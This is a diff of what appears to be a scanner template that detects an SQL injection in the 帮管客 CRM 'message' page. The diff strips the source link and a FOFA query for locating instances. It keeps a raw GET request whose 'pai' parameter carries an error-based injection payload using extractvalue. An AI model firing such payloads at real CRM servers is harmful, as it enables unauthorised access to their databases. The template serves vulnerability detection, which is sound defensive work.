@@ -3,12 +3,8 @@ info:
   name: 帮管家CRM-message-SQL注入
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/coselrmngfwl3qzm'
+  description: ''
   tags: sqli,2024
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: coselrmngfwl3qzm
-    fofa: app="帮管客-CRM"
 http:
 - raw:
   - 'GET /index.php/message?page=1&pai=1%20and%20extractvalue(0x7e,concat(0x7e,(select%20md5(1)),0x7e))%23&xu=desc HTTP/1.1
